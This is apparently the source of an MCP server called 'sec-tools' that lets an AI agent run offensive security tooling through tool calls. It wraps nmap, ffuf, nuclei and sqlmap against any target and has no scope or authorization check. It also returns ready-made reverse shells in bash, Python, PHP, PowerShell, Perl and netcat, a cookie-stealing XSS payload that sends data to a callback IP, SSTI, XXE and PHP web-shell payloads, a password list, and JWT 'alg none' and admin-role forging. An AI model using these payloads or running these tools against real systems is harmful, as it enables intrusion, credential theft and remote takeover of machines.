const { Server } = require("@modelcontextprotocol/sdk/server/index.js");
const { StdioServerTransport } = require("@modelcontextprotocol/sdk/server/stdio.js");
const { CallToolRequestSchema, ListToolsRequestSchema } = require("@modelcontextprotocol/sdk/types.js");
const { execFile } = require("child_process");
const https = require("https");
const http = require("http");
const crypto = require("crypto");

// Secure execution using execFile (no shell interpolation, prevents command injection)
function runExecFile(file, args, timeout = 120000) {
  return new Promise((resolve) => {
    execFile(file, args, { timeout, encoding: "utf8", maxBuffer: 1024 * 1024 * 10 }, (err, stdout, stderr) => {
      resolve({
        success: !err,
        output: (stdout || "") + (stderr || ""),
        error: err ? err.message : null
      });
    });
  });
}

function httpGet(url, headers = {}) {
  return new Promise((resolve) => {
    const mod = url.startsWith("https") ? https : http;
    const req = mod.get(url, { headers, timeout: 10000 }, (res) => {
      let body = "";
      res.on("data", (d) => body += d);
      res.on("end", () => resolve({ status: res.statusCode, headers: res.headers, body }));
    });
    req.on("error", (e) => resolve({ error: e.message }));
    req.on("timeout", () => { req.destroy(); resolve({ error: "timeout" }); });
  });
}

// Input Sanitizers & Whitelists
function sanitizeTarget(target) {
  if (typeof target !== "string") return "";
  // Strip shell metacharacters and invalid host chars
  return target.replace(/[^a-zA-Z0-9.\-_:/]/g, "").trim();
}

function sanitizePorts(ports) {
  if (typeof ports !== "string") return "-";
  return ports.replace(/[^0-9,\-]/g, "").trim() || "-";
}

function parseFlags(flagsStr) {
  if (typeof flagsStr !== "string") return [];
  // Tokenize flag string into array elements cleanly without shell execution
  return flagsStr.split(/\s+/).filter(f => /^[a-zA-Z0-9\-_=.]+$/.test(f));
}

const toolHandlers = {
  "sec-nmap": async (args) => {
    const target = sanitizeTarget(args.target);
    if (!target) return { content: [{ type: "text", text: "Error: target host/IP is required" }], isError: true };

    const ports = sanitizePorts(args.ports);
    const flags = parseFlags(args.flags || "-sV -sC --open -T4");
    const cmdArgs = [...flags, "-p", ports, target];

    const r = await runExecFile("nmap", cmdArgs, 120000);
    return { content: [{ type: "text", text: r.output || r.error || "no output" }] };
  },

  "sec-ffuf": async (args) => {
    const url = sanitizeTarget(args.url);
    if (!url) return { content: [{ type: "text", text: "Error: URL is required" }], isError: true };

    const wordlist = args.wordlist || "C:\\cyberstrike\\.cyberstrike\\wordlists\\common-paths.txt";
    const mc = (args.mc || "200,301,403").replace(/[^0-9,]/g, "");
    const cmdArgs = ["-w", wordlist, "-u", `${url}/FUZZ`, "-mc", mc, "-t", "50"];

    const r = await runExecFile("ffuf", cmdArgs, 120000);
    return { content: [{ type: "text", text: r.output || r.error || "no output" }] };
  },

  "sec-nuclei": async (args) => {
    const target = sanitizeTarget(args.target);
    if (!target) return { content: [{ type: "text", text: "Error: target is required" }], isError: true };

    const severity = (args.severity || "critical,high").replace(/[^a-zA-Z,]/g, "");
    const cmdArgs = ["-u", target, "-severity", severity, "-silent"];

    const r = await runExecFile("nuclei", cmdArgs, 120000);
    return { content: [{ type: "text", text: r.output || r.error || "no output" }] };
  },

  "sec-sqlmap": async (args) => {
    const url = args.url ? args.url.trim() : "";
    if (!url) return { content: [{ type: "text", text: "Error: URL is required" }], isError: true };

    const cmdArgs = ["-u", url];
    if (args.batch !== false) cmdArgs.push("--batch");
    if (args.dbs !== false) cmdArgs.push("--dbs");
    if (args.risk) cmdArgs.push(`--risk=${Math.min(3, Math.max(1, Number(args.risk) || 1))}`);
    if (args.level) cmdArgs.push(`--level=${Math.min(5, Math.max(1, Number(args.level) || 1))}`);

    const r = await runExecFile("sqlmap", cmdArgs, 120000);
    return { content: [{ type: "text", text: r.output || r.error || "no output" }] };
  },

  "sec-payload": async (args) => {
    const type = args.type || "";
    const ip = sanitizeTarget(args.ip || "127.0.0.1");
    const port = Number(args.port) || 4444;
    const payloads = {
      "reverse-shell-bash": `bash -i >& /dev/tcp/${ip}/${port} 0>&1`,
      "reverse-shell-python": `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,
      "reverse-shell-php": `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`,
      "reverse-shell-powershell": `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${ip}",${port});$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1 | Out-String);$sendback2=$sendback+"PS "+(Get-Location).Path+"> ";$sendbyte=[text.encoding]::ASCII.GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`,
      "xss-basic": `<script>alert(document.cookie)</script>`,
      "xss-steal": `<img src=x onerror="fetch('http://${ip}:${port}/?c='+document.cookie)">`,
      "sqli-union": `' UNION SELECT null,version(),user()-- -`,
      "sqli-blind": `' OR (SELECT 1 FROM (SELECT SLEEP(5))a)-- -`,
      "ssti-jinja2": `{{''.__class__.__mro__[1].__subclasses__()|attr('__init__')|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('id')|attr('read')()}}`,
      "xxe": `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`,
      "lfi": `../../../etc/passwd`,
      "cmd-injection": `; id`,
      "webshell-php": `<?php system($_GET['cmd']); ?>`
    };
    const result = payloads[type] || `Available types: ${Object.keys(payloads).join(", ")}`;
    return { content: [{ type: "text", text: result }] };
  },

  "sec-revshell": async (args) => {
    const ip = sanitizeTarget(args.ip || "127.0.0.1");
    const port = Number(args.port) || 4444;
    const shell = args.shell || "bash";
    const shells = {
      "bash": `bash -i >& /dev/tcp/${ip}/${port} 0>&1`,
      "python": `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,
      "php": `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`,
      "netcat": `nc -e /bin/sh ${ip} ${port}`,
      "powershell": `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${ip}",${port});$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1 | Out-String);$sendback2=$sendback+"PS "+(Get-Location).Path+"> ";$sendbyte=[text.encoding]::ASCII.GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`,
      "perl": `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`
    };
    const result = shells[shell] || `Available shells: ${Object.keys(shells).join(", ")}`;
    return { content: [{ type: "text", text: result }] };
  },

  "sec-encode": async (args) => {
    const data = args.data || "";
    const method = args.method || "base64";
    const methods = {
      "base64": Buffer.from(data).toString("base64"),
      "base64-decode": Buffer.from(data, "base64").toString("utf8"),
      "url-encode": encodeURIComponent(data),
      "url-decode": decodeURIComponent(data),
      "hex": Buffer.from(data).toString("hex"),
      "hex-decode": Buffer.from(data, "hex").toString("utf8"),
      "md5": crypto.createHash("md5").update(data).digest("hex"),
      "sha256": crypto.createHash("sha256").update(data).digest("hex"),
      "sha1": crypto.createHash("sha1").update(data).digest("hex"),
      "rot13": data.replace(/[a-zA-Z]/g, (c) => {
        const base = c <= "Z" ? 65 : 97;
        return String.fromCharCode(((c.charCodeAt(0) - base + 13) % 26) + base);
      })
    };
    const result = methods[method] || `Available methods: ${Object.keys(methods).join(", ")}`;
    return { content: [{ type: "text", text: result }] };
  },

  "sec-wordlist": async (args) => {
    const type = args.type || "common";
    const custom = args.custom || "";
    const wordlists = {
      "common": "admin\nadministrator\ntest\nguest\nroot\nuser\nbackup\ndb\nconfig\napi\napp\nassets\ncache\ncgi-bin\ncss\ndata\ndb\ndev\ndocs\ndownload\nfiles\nimages\nimg\nincludes\njs\nlib\nlogs\nmedia\nprivate\npublic\nscripts\nsrc\ntemp\ntest\ntests\ntmp\nupload\nuploads\nvendor\nwp-admin\nwp-content\nwp-includes",
      "passwords": "password\n123456\n123456789\nqwerty\nabc123\nmonkey\nmaster\ndragon\nlogin\nprincess\nadmin123\nwelcome\nshadow\nsunshine\ntrustno1\niloveyou\nbatman\naccess\nhello\ncharlie\ndonald\npassword1\n12345678\n1234567\nfootball\nmichael\npasswd\ntest123\nroot123\nadmin123\nletmein\nwelcome1\nmonkey123\npassword123",
      "subdomains": "www\nmail\nftp\nlocalhost\nwebmail\nsmtp\npop\nns1\nns2\nns3\napi\ndev\ntest\nstage\nadmin\nportal\nvpn\nsecure\nremote\nblog\nshop\nforum\nchat\ncdn\nstatic\nmedia\nimages\nimg\ncss\njs\nassets\nfiles\ndownload\nupload\ntemp\ntmp\nbackup\ndb\ndatabase\nsql\nmysql\npostgres\nredis\nmongo\nelastic\nsearch\nmonitor\ngrafana\nkibana\nlogs\nanalytics\nmetrics\nstatus\nhealth\ninfo\nabout\nhelp\nsupport\ncontact\n\napi-dev\napi-staging\napi-prod\napp-dev\napp-staging\napp-prod\nbackend\nfrontend\ninternal\nexternal\nprivate\npublic"
    };
    if (custom) return { content: [{ type: "text", text: custom }] };
    const result = wordlists[type] || `Available types: ${Object.keys(wordlists).join(", ")}. Or pass custom=your,word,list`;
    return { content: [{ type: "text", text: result }] };
  },

  "sec-headers": async (args) => {
    const url = args.url ? args.url.trim() : "";
    if (!url) return { content: [{ type: "text", text: "Error: URL argument required" }], isError: true };
    const r = await httpGet(url, { "User-Agent": "sec-tools/2.0" });
    if (r.error) return { content: [{ type: "text", text: `Error: ${r.error}` }] };

    const securityHeaders = {
      "strict-transport-security": "HSTS",
      "content-security-policy": "CSP",
      "x-frame-options": "Clickjacking protection",
      "x-content-type-options": "MIME sniffing protection",
      "referrer-policy": "Referrer policy",
      "permissions-policy": "Permissions policy",
      "cross-origin-opener-policy": "COOP",
      "cross-origin-resource-policy": "CORP"
    };
    const found = [];
    const missing = [];
    for (const [header, desc] of Object.entries(securityHeaders)) {
      if (r.headers[header]) {
        found.push(`${header}: ${r.headers[header]} (${desc})`);
      } else {
        missing.push(`${header} (${desc})`);
      }
    }
    const server = r.headers["server"] || "not disclosed";
    const powered = r.headers["x-powered-by"] || "not disclosed";
    let output = `URL: ${url}\nStatus: ${r.status}\nServer: ${server}\nX-Powered-By: ${powered}\n\n`;
    output += `PRESENT (${found.length}):\n${found.join("\n") || "none"}\n\n`;
    output += `MISSING (${missing.length}):\n${missing.join("\n") || "none"}`;
    return { content: [{ type: "text", text: output }] };
  },

  "sec-cors": async (args) => {
    const url = args.url ? args.url.trim() : "";
    if (!url) return { content: [{ type: "text", text: "Error: URL argument required" }], isError: true };
    const evilOrigin = args.origin || "https://evil.com";

    const r = await httpGet(url, { "Origin": evilOrigin });
    if (r.error) return { content: [{ type: "text", text: `Error: ${r.error}` }] };

    const acao = r.headers["access-control-allow-origin"];
    const acac = r.headers["access-control-allow-credentials"];
    let output = `URL: ${url}\nTested Origin: ${evilOrigin}\nStatus: ${r.status}\n\n`;
    output += `Access-Control-Allow-Origin: ${acao || "not set"}\n`;
    output += `Access-Control-Allow-Credentials: ${acac || "not set"}\n\n`;
    if (acao === evilOrigin && acac === "true") {
      output += "VULNERABLE: Reflects arbitrary origin with credentials enabled";
    } else if (acao === "*") {
      output += "WARNING: Wildcard origin (safe only if credentials disabled)";
    } else if (acao) {
      output += "Reflects specific origin — check if it matches trusted domains";
    } else {
      output += "No CORS headers — not vulnerable";
    }
    return { content: [{ type: "text", text: output }] };
  },

  "sec-jwt": async (args) => {
    const token = args.token || "";
    const action = args.action || "decode";
    if (!token) return { content: [{ type: "text", text: "Error: token argument required" }], isError: true };

    const parts = token.split(".");
    if (parts.length !== 3) return { content: [{ type: "text", text: "Error: invalid JWT format (expected 3 parts)" }], isError: true };

    try {
      const header = JSON.parse(Buffer.from(parts[0], "base64url").toString());
      const payload = JSON.parse(Buffer.from(parts[1], "base64url").toString());
      if (action === "decode") {
        return { content: [{ type: "text", text: `Header:\n${JSON.stringify(header, null, 2)}\n\nPayload:\n${JSON.stringify(payload, null, 2)}` }] };
      }
      if (action === "forge-none") {
        const h = Buffer.from(JSON.stringify({ alg: "none", typ: "JWT" })).toString("base64url");
        const p = Buffer.from(JSON.stringify(payload)).toString("base64url");
        return { content: [{ type: "text", text: `${h}.${p}.` }] };
      }
      if (action === "forge-admin") {
        const h = Buffer.from(JSON.stringify({ alg: header.alg || "HS256", typ: "JWT" })).toString("base64url");
        const p = Buffer.from(JSON.stringify({ ...payload, role: "admin", isAdmin: true })).toString("base64url");
        return { content: [{ type: "text", text: `${h}.${p}.SIGNATURE_NEEDED` }] };
      }
      return { content: [{ type: "text", text: `Available actions: decode, forge-none, forge-admin` }] };
    } catch (e) {
      return { content: [{ type: "text", text: `Error parsing JWT: ${e.message}` }], isError: true };
    }
  }
};

// Distinct, per-tool schemas for clean LLM tool calling
const toolDefs = [
  {
    name: "sec-nmap",
    description: "Port scanning with nmap",
    inputSchema: {
      type: "object",
      properties: {
        target: { type: "string", description: "Target host or IP address (e.g. 192.168.1.1 or example.com)" },
        ports: { type: "string", description: "Port range (e.g. 80,443 or 1-1000 or -)" },
        flags: { type: "string", description: "Additional nmap flags (e.g. -sV -sC --open -T4)" }
      },
      required: ["target"]
    }
  },
  {
    name: "sec-ffuf",
    description: "Directory and path brute-forcing with ffuf",
    inputSchema: {
      type: "object",
      properties: {
        url: { type: "string", description: "Base target URL (e.g. http://example.com)" },
        wordlist: { type: "string", description: "Path to wordlist file" },
        mc: { type: "string", description: "Match HTTP status codes (e.g. 200,301,403)" }
      },
      required: ["url"]
    }
  },
  {
    name: "sec-nuclei",
    description: "Vulnerability scanning with nuclei",
    inputSchema: {
      type: "object",
      properties: {
        target: { type: "string", description: "Target URL or host" },
        severity: { type: "string", description: "Severity filter (e.g. critical,high,medium)" }
      },
      required: ["target"]
    }
  },
  {
    name: "sec-sqlmap",
    description: "Automated SQL injection testing with sqlmap",
    inputSchema: {
      type: "object",
      properties: {
        url: { type: "string", description: "Target URL with parameter (e.g. http://example.com/item.php?id=1)" },
        batch: { type: "boolean", description: "Never ask for user input, use default behavior" },
        dbs: { type: "boolean", description: "Enumerate DBMS databases" },
        risk: { type: "number", description: "Risk level (1-3)" },
        level: { type: "number", description: "Level of tests (1-5)" }
      },
      required: ["url"]
    }
  },
  {
    name: "sec-payload",
    description: "Generate security testing payloads (reverse shells, XSS, SQLi, SSTI, XXE, LFI)",
    inputSchema: {
      type: "object",
      properties: {
        type: { type: "string", description: "Payload type (reverse-shell-bash, xss-basic, sqli-union, ssti-jinja2, xxe, lfi, cmd-injection)" },
        ip: { type: "string", description: "Callback IP address" },
        port: { type: "number", description: "Callback port number" }
      },
      required: ["type"]
    }
  },
  {
    name: "sec-revshell",
    description: "Generate reverse shell commands",
    inputSchema: {
      type: "object",
      properties: {
        ip: { type: "string", description: "Attacker listener IP" },
        port: { type: "number", description: "Attacker listener port" },
        shell: { type: "string", description: "Shell type (bash, python, php, netcat, powershell, perl)" }
      },
      required: ["ip", "port"]
    }
  },
  {
    name: "sec-encode",
    description: "Encode or decode strings using common security encodings and hashes",
    inputSchema: {
      type: "object",
      properties: {
        data: { type: "string", description: "Input text/data" },
        method: { type: "string", description: "Encoding method (base64, base64-decode, url-encode, url-decode, hex, hex-decode, md5, sha256, rot13)" }
      },
      required: ["data", "method"]
    }
  },
  {
    name: "sec-wordlist",
    description: "Generate or retrieve standard wordlists",
    inputSchema: {
      type: "object",
      properties: {
        type: { type: "string", description: "Wordlist type (common, passwords, subdomains)" },
        custom: { type: "string", description: "Custom comma-separated items" }
      }
    }
  },
  {
    name: "sec-headers",
    description: "Inspect HTTP security headers and server information",
    inputSchema: {
      type: "object",
      properties: {
        url: { type: "string", description: "Target URL to inspect" }
      },
      required: ["url"]
    }
  },
  {
    name: "sec-cors",
    description: "Test CORS configuration for origin reflection vulnerabilities",
    inputSchema: {
      type: "object",
      properties: {
        url: { type: "string", description: "Target URL" },
        origin: { type: "string", description: "Origin header to send for testing" }
      },
      required: ["url"]
    }
  },
  {
    name: "sec-jwt",
    description: "Decode and test JSON Web Tokens",
    inputSchema: {
      type: "object",
      properties: {
        token: { type: "string", description: "JWT string" },
        action: { type: "string", description: "Action to perform (decode, forge-none, forge-admin)" }
      },
      required: ["token"]
    }
  }
];

const server = new Server({ name: "sec-tools", version: "2.1.0" }, { capabilities: { tools: {} } });

server.setRequestHandler(ListToolsRequestSchema, async () => ({ tools: toolDefs }));

server.setRequestHandler(CallToolRequestSchema, async (req) => {
  const handler = toolHandlers[req.params.name];
  if (!handler) {
    return { content: [{ type: "text", text: `Unknown tool: ${req.params.name}` }], isError: true };
  }
  return handler(req.params.arguments || {});
});

async function main() {
  const transport = new StdioServerTransport();
  await server.connect(transport);
}

main().catch(console.error);
